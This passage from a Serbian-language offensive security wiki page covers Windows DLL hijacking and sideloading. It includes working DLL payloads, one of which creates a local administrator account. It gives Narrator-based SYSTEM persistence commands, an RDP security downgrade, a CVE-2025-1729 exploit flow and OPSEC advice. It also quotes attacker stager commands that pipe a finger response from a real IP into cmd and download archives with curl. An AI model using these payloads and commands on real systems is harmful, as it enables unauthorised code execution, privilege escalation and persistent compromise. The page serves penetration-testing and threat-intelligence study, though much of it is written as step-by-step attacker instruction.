    return TRUE;
}
```

<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Studija slučaja: Hijacking localization DLL-a Narrator OneCore TTS (pristupačnost/AT)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljiv, jezički specifičan localization DLL koji se može hijack-ovati za proizvoljno izvršavanje koda i postojanost.<sup>[[7]](#references)</sup>

Ključne činjenice
- Putanja provere (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Zastarela putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako se na OneCore putanji nalazi DLL koji može da se menja i koji kontroliše napadač, on se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Nisu potrebni nikakvi exports.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC tišina
- Naivan hijack će oglasiti/highlight-ovati UI. Da biste ostali neprimetni, pri attach-u izlistajte Narrator niti, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte je pomoću `SuspendThread`; nastavite rad u sopstvenoj niti. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Pokretanje i postojanost putem Accessibility konfiguracije
- Korisnički kontekst (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kada se primeni gorenavedeno, pokretanje Narrator-a učitava podmetnuti DLL. Na bezbednoj radnoj površini (ekranu za prijavu) pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.

Izvršavanje kao SYSTEM pokrenuto preko RDP-a (lateral movement)
- Dozvolite klasični bezbednosni sloj RDP-a: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se sa hostom putem RDP-a, pa na ekranu za prijavu pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.
- Izvršavanje se zaustavlja kada se RDP sesija zatvori — brzo izvršite inject/migrate.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni unos Accessibility Tool (AT) u registru (npr. CursorIndicator), izmeniti ga tako da upućuje na proizvoljni binarni fajl/DLL, uvesti ga, pa zatim postaviti `configuration` na ime tog AT-a. Time se proizvoljno izvršavanje posreduje kroz Accessibility okvir.

Napomene
- Za pisanje u `%windir%\System32` i promenu HKLM vrednosti potrebna su administratorska prava.
- Sva logika payload-a može biti smeštena u `DLL_PROCESS_ATTACH`; export-i nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation pomoću TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe` se nalazi u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zakazani zadatak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` pokreće se svakog dana u 9:30 ujutru u kontekstu prijavljenog korisnika.
- **Dozvole direktorijuma**: Omogućeno je pisanje za `CREATOR OWNER`, što lokalnim korisnicima omogućava da ubace proizvoljne fajlove.
- **Ponašanje DLL pretrage**: Program prvo pokušava da učita `hostfxr.dll` iz svog radnog direktorijuma i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na prioritet pretrage u lokalnom direktorijumu.

### Implementacija exploita

Napadač može da postavi zlonamerni `hostfxr.dll` stub u isti direktorijum i iskoristi nedostajući DLL za izvršavanje koda u kontekstu korisnika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Tok napada

1. Kao standardni korisnik, smestite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 pod kontekstom trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, maliciozni DLL se pokreće u administratorskoj sesiji uz srednji nivo integriteta.
4. Kombinujte standardne UAC bypass tehnike da biste podigli privilegije sa srednjeg nivoa integriteta na SYSTEM.

## Studija slučaja: MSI CustomAction dropper + DLL Side-Loading preko potpisanog hosta (wsc_proxy.exe)

Napadači često kombinuju MSI dropper-e sa DLL Side-Loading-om kako bi izvršili payload-e u okviru pouzdanog, potpisanog procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se neprimetno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija) i rekonstruiše sledeću fazu iz ugrađenih resursa.
- Dropper zapisuje legitimni, potpisani EXE i maliciozni DLL u isti direktorijum (primer para: Avast-potpisani wsc_proxy.exe + wsc.dll pod kontrolom napadača).
- Kada se potpisani EXE pokrene, redosled pretrage Windows DLL-ova prvo učitava wsc.dll iz radnog direktorijuma, čime se izvršava kod napadača pod potpisanim roditeljskim procesom (ATT&CK T1574.001).

Analiza MSI-ja (na šta obratiti pažnju)
- Tabela CustomAction:
  - Potražite stavke koje pokreću izvršne datoteke ili VBScript. Primer sumnjivog obrasca: LaunchApplication pokreće ugrađenu datoteku u pozadini.
  - U Orca (Microsoft Orca.exe) pregledajte tabele CustomAction, InstallExecuteSequence i Binary.
- Ugrađeni/podeljeni payload-i u MSI CAB-u:
  - Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ili koristite lessmsi: lessmsi x package.msi C:\out
  - Potražite više malih fragmenata koje VBScript CustomAction spaja i dešifruje. Uobičajen tok:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktičan sideloading pomoću wsc_proxy.exe
- Smestite ove dve datoteke u istu fasciklu:
  - wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
  - wsc.dll: DLL napadača. Ako nisu potrebni određeni exporti, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exporte pravoj biblioteci, dok se payload izvršava u DllMain.
- Napravite minimalni DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Za zahteve za eksportovanje koristite proxying framework (npr. DLLirant/Spartacus) da biste generisali forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na rezoluciju naziva DLL-a koju obavlja host binarni fajl. Ako host koristi apsolutne putanje ili bezbedne zastavice za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack možda neće uspeti.
- KnownDLLs, SxS i prosleđeni eksporti mogu da utiču na prioritet i to treba uzeti u obzir pri izboru host binarnog fajla i skupa eksportovanih funkcija.

## Potpisani trijadi + šifrovani payload-i (studija slučaja ShadowPad)

Check Point je opisao kako Ink Dragon primenjuje ShadowPad koristeći **trijadu od tri fajla** da bi se uklopio u legitimni softver, dok glavni payload ostaje šifrovan na disku:<sup>[[12]](#references)</sup>

1. **Potpisani host EXE** – zloupotrebljavaju se proizvođači kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršnu datoteku tako da izgleda kao Windows binarni fajl (na primer `conhost.exe`), ali Authenticode potpis ostaje važeći.
2. **Zlonamerni loader DLL** – smešta se pored EXE fajla pod očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binarni fajl obfuskovan pomoću ScatterBrain framework-a; njegov jedini zadatak je da pronađe šifrovani blob, dešifruje ga i reflektivno mapira ShadowPad.
3. **Šifrovani payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon mapiranja dešifrovanog payload-a u memoriju, loader briše TMP fajl da bi uništio forenzičke dokaze.

Napomene o tradecraft-u:

* Preimenovanje potpisanog EXE fajla (uz zadržavanje originalnog `OriginalFileName` u PE zaglavlju) omogućava mu da se predstavlja kao Windows binarni fajl, a da zadrži potpis proizvođača. Zato oponašajte naviku Ink Dragon-a da postavlja binarne fajlove koji izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA uslužni programi.
* Pošto izvršna datoteka ostaje pouzdana, većina kontrola za dozvoljavanje izvršavanja treba samo da dozvoli da vaš zlonamerni DLL bude pored nje. Usredsredite se na prilagođavanje loader DLL-a; potpisani nadređeni fajl obično može da se pokrene neizmenjen.
* ShadowPad-ov dekriptor očekuje da se TMP blob nalazi pored loader-a i da može da se menja, kako bi mogao da poništi sadržaj fajla nakon mapiranja. Ostavite direktorijum upisivim dok se payload ne učita; kada se učita u memoriju, TMP fajl se može bezbedno obrisati radi OPSEC-a.

### LOLBAS stager + lanac sideloading-a etapno preuzete arhive (finger → tar/curl → WMI)

Operateri kombinuju DLL sideloading sa LOLBAS-om tako da je jedini prilagođeni artefakt na disku zlonamerni DLL pored pouzdanog EXE fajla:<sup>[[1]](#references)</sup>

- **Udaljeni command loader (Finger):** Skriveni PowerShell pokreće `cmd.exe /c`, preuzima komande sa Finger servera i prosleđuje ih u `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava odgovor servera, što operaterima omogućava da menjaju drugi stepen na strani servera.

- **Ugrađeno preuzimanje/raspakivanje:** Preuzmite arhivu sa bezazlenom ekstenzijom, raspakujte je i smestite metu za sideload i DLL u nasumičnu fasciklu `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` skriva prikaz napretka i prati preusmeravanja; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM pokretanje:** Pokrenite EXE preko WMI-ja kako bi telemetrija prikazala proces koji je pokrenuo CIM dok učitava DLL iz istog direktorijuma:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Radi sa binarnim fajlovima koji preferiraju lokalne DLL-ove (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) pokreće se pod pouzdanim imenom.

- **Detekcija:** Upozori na `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; ova kombinacija je neuobičajena van administratorskih skripti.


## Studija slučaja: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavni upad grupe Lotus Blossom zloupotrebio je pouzdani lanac ažuriranja da bi isporučio dropper upakovan pomoću NSIS-a, koji je postavio DLL sideload i payload-e koji se u potpunosti izvršavaju u memoriji.<sup>[[13]](#references)</sup>

Tok napada
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, postavlja preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, zlonamerni `log.dll` i šifrovani blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE uvozi `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` učitava blob pomoću mmap; `LogWrite` ga dešifruje prilagođenim stream-шифром заснованим на LCG-у (константе **0x19660D** / **0x3C6EF35F**, материјал кључа изведен из претходног хеша), преписује бафер shellcode-ом у отвореном тексту, ослобађа привремене податке и скаче на њега.
- Да би избегао IAT, loader разрешава API-је хеширањем извозних имена помоћу **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, затим примењује Murmur-style avalanche (**0x85EBCA6B**) и пореди резултат са циљним хешевима са додатом salt вредношћу.

Главни shellcode (Chrysalis)
- Дешифрује главни модул налик PE-у понављањем операција add/XOR/sub са кључем `gQ2JR&9;` током пет пролаза, а затим динамички учитава `Kernel32.dll` → `GetProcAddress` да би довршио разрешавање import-а.
- Поново саставља стрингове са именима DLL-ова у runtime-у помоћу трансформација bit-rotate/XOR за сваки знак, а затим учитава `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Користи други resolver који пролази кроз **PEB → InMemoryOrderModuleList**, парсира сваку извозну табелу у блоковима од 4 бајта уз Murmur-style мешање и позива `GetProcAddress` само ако хеш није пронађен.

Уграђена конфигурација и C2
- Конфигурација се налази унутар испуштене датотеке `BluetoothService` на **offset 0x30808** (величина **0x980**) и дешифрује се помоћу RC4 са кључем `qwhvb^435h&*7`, чиме се откривају C2 URL и User-Agent.
- Beacon-ови формирају тачкама раздвојен профил хоста, додају испред ознаку `4Q`, а затим га шифрују помоћу RC4 са кључем `vAuig34%^325hGV` пре позива `HttpSendRequestA` преко HTTPS-а. Одговори се дешифрују помоћу RC4 и обрађују преко switch-а са ознакама (`4T` shell, `4V` извршавање процеса, `4W/4X` упис датотеке, `4Y` читање/ексфилтрација, `4\\` деинсталација, `4` набрајање дискова/датотека + случајеви преноса у деловима).
- Режим извршавања одређују CLI аргументи: без аргумената = инсталирање перзистенције (service/Run key) која упућује на `-i`; `-i` поново покреће сам себе са `-k`; `-k` прескаче инсталацију и покреће payload.

Уочен је алтернативни loader
- Исти упад је поставио Tiny C Compiler и покренуо `svchost.exe -nostdlib -run conf.c` из `C:\ProgramData\USOShared\`, са `libtcc.dll` поред њега. C изворни код који је доставио нападач садржао је shellcode, компајлирао се и покретао у меморији, без уписивања PE-а на диск. Репродукујте помоћу:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ova faza kompajliranja i pokretanja zasnovana na TCC-u u runtime-u je uvezla Wininet.dll i preuzela shellcode druge faze sa hardkodiranog URL-a, pružajući fleksibilan loader koji se predstavlja kao pokretanje kompajlera.

## DLL sideloading potpisanog hosta uz export proxying + parkiranje host thread-a

Neki lanci DLL sideloading-a dodaju **stabilizaciju** kako bi legitimni host ostao aktivan dovoljno dugo da pravilno učita kasnije faze, umesto da se sruši nakon učitavanja zlonamernog DLL-a.<sup>[[11]](#references)</sup>

Uočeni obrazac
- Smestite pouzdani EXE pored zlonamernog DLL-a koristeći očekivano ime zavisnosti, kao što je version.dll.
- Zlonamerni DLL **prosleđuje svaki očekivani export** nazad ka pravom sistemskom DLL-u (na primer, %SystemRoot%\\System32\\version.dll), tako da razrešavanje importa i dalje uspeva, a host proces nastavlja da radi.
- Nakon učitavanja, zlonamerni DLL **patch-uje ulaznu tačku hosta** tako da glavna nit ulazi u beskonačnu Sleep petlju umesto da se završi ili izvršava putanje koda koje bi prekinule proces.
- Nova nit obavlja stvarni zlonamerni posao: dešifruje ime ili putanju DLL-a sledeće faze (RC4/XOR su uobičajeni), a zatim ga pokreće pomoću LoadLibrary.

Zašto je ovo važno
- Uobičajeni DLL proxying čuva API kompatibilnost, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije faze.
- Parkiranje glavne niti u Sleep(INFINITE) jednostavan je način da potpisani proces ostane aktivan dok loader obavlja dešifrovanje, pripremu ili mrežno pokretanje u worker thread-u.
- Lov na sumnjiv DllMain može da propusti ovaj obrazac ako se zanimljivo ponašanje dogodi nakon patch-ovanja ulazne tačke hosta i pokretanja sekundarne niti.

Minimalni tok rada
1. Kopirajte potpisani host EXE i utvrdite koji DLL učitava iz lokalnog direktorijuma.
2. Napravite proxy DLL koji izvozi iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U DllMain(DLL_PROCESS_ATTACH) kreirajte worker thread.
4. Iz te niti patch-ujte ulaznu tačku hosta ili početnu rutinu glavne niti tako da se izvršava petlja sa Sleep.
5. Dešifrujte ime/konfiguraciju DLL-a sledeće faze i pozovite LoadLibrary ili ručno mapirajte payload.

Odbrambene tačke za istragu
- Potpisani procesi koji učitavaju version.dll ili slične uobičajene biblioteke iz sopstvenog direktorijuma aplikacije umesto iz System32.
- Izmene memorije na ulaznoj tački procesa ubrzo nakon učitavanja image-a, naročito skokovi/pozivi preusmereni na Sleep/SleepEx.
- Niti koje kreira proxy DLL, a koje odmah pozivaju LoadLibrary za drugi DLL sa dešifrovanim imenom.
- Proxy DLL-ovi sa svim export-ima smešteni pored izvršnih datoteka dobavljača u direktorijumima za pripremu sa dozvolom za upis, kao što su ProgramData, %TEMP% ili putanje do raspakovanih arhiva.

## References

- [1] [Red Canary – Uvidi u obaveštajne podatke: januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Eskalacija privilegija pomoću TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking u Windows-u. Jednostavan primer u C-u.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore postavlja novi malware koji cilja Evropu](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hakovanje pristupačnosti: kada se DLL hijacking spoji sa Windows pomoćnim programima](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitalni dvojnici: analiza kampanja lažnog predstavljanja koje se razvijaju i distribuiraju Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zajednički interesi: analiza klastera pretnji koji ciljaju vladu jedne države jugoistočne Azije](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relejne mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: detaljna analiza Lotus Blossom-ovog alata](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack lanac](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Praćenje špijunskih kampanja iranskog APT-a Screening Serpens iz 2026. godine](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Brzi i žestoki: operacije Nimbus Manticore tokom iranskog sukoba](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Akcije zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cilja vlade i kritičnu infrastrukturu jugoistočne Azije](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
